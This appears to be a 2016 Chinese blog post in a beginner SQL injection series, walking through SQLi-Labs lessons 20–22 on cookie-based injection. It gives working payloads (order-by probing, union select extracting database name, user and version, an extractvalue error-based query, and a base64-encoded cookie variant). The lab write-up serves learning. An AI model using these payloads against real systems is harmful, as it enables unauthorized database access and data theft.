---
layout: post
title: "「SQL注入入门篇」SQL注入（十一）"
subtitle:   "为什么我是web安全菜鸡啊！！！"
date: 2016-11-12 12:00:00
author:     "许大仙"
tags:
    - web安全
---

<h2>Less-20</h2>
基于cookie的注入

<h3>概述</h3>
打开后发现是一个登录界面，在登录之后会保存下cookie，当cookie保存时，刷新页面直接能登陆进来，我们可以获取用户名，密码，ID等信息。

<img src="http://oc42vgpoj.bkt.clouddn.com/less20_right.png" />

所谓基于cookie的注入就是通过修改cookie的值，等刷新页面的时候，网站会带入cookie的值进行查找，以此来实现注入

要修改cookie的值，可以祭出神器Firebug

<h3>测试</h3>
&nbsp;

在把cookie的值改为 uname=admin' 的时候报错，存在注入。我们可以猜出闭合的方式，构造语句，方式和简单的Get注入类似

<img src="http://oc42vgpoj.bkt.clouddn.com/less20_test.png" />

<strong>注意这里修改的时候要更改下cookie过期的时间，否则会被删除</strong>

<h3>Payload</h3>
<pre class="lang:tsql decode:true">admin' order by 1,2,3,4 #
admin' order by 1,2,3 #</pre>

<img src="http://oc42vgpoj.bkt.clouddn.com/less20_payload2.png" />

<pre class="lang:tsql decode:true">' union select 1,2,3 #</pre>
<img src="http://oc42vgpoj.bkt.clouddn.com/less20_payload1.png" />

<pre class="lang:tsql decode:true">' union select database(),user(),version() #</pre>
<img src="http://oc42vgpoj.bkt.clouddn.com/less20_payload3.png" />

<pre class="lang:tsql decode:true">admin' and extractvalue(1,concat(0x7e,(select database()),0x7e)) #</pre>
<h2>Less-21</h2>
同理，不过这次cookie进行了base64加密

<pre class="lang:tsql decode:true" title="Payload">JykgdW5pb24gc2VsZWN0IGRhdGFiYXNlKCksdXNlcigpLHZlcnNpb24oKSAjIA==

// ') union select database(),user(),version() #</pre>

<h2>Less-22</h2>
同理，单引号变双引号

&nbsp;